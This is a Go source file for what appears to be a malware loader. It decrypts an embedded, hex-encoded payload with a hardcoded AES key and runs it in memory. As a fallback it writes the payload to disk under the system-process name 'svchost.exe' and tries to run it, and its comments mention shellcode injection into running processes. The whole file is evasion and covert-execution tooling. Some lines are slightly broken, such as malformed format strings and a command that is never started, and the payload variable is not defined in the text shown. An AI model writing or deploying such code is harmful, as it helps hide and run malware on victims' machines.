
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"encoding/hex"
	"io/ioutil"
	"fmt"
	"os/exec"
	"github.com/amenzhinsky/go-memexec"

)

func createHash(key string) string {
	hasher := md5.New()
	hasher.Write([]byte(key))
	return hex.EncodeToString(hasher.Sum(nil))
}

func decrypt(data []byte, passphrase string) []byte {
	// Does not require a IV like AES-CBC
	// unhashes the decryption password by comparing hashes
	key := []byte(createHash(passphrase))
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err.Error())
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}
	nonceSize := gcm.NonceSize()
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		panic(err.Error())
	}
	return plaintext
}

func decryptFile(filename string, passphrase string) []byte {
	// Reads and decrypts and returns a string, which is what we don't want
	data, _ := ioutil.ReadFile(filename)

	return decrypt(data, passphrase)
}

func main() {
	decodedDat, err := hex.DecodeString(dat)
	if err != nil {
		fmt.Printf("#{err}")
	}
	decryptedDat := decrypt([]byte(decodedDat), ".e$Btli&d:)tm%d}cDicnrU.me4di:o//>uhJ|dqsiHscH1hb:td|iMQleYo*nX.")
	// First attempt injecting shellcode into running processes
	// Then attempt in-memory execution
	exe, err := memexec.New(decryptedDat)
	if err != nil {
		fmt.Printf("#{err]")
	}
	defer exe.Close()
	cmd := exe.Command()
	cmd.Output()
	// Then try to write a file on the disk and execute it
	ioutil.WriteFile("./svchost.exe", decryptedDat, 0777)
	exec.Command("svchost.exe")
}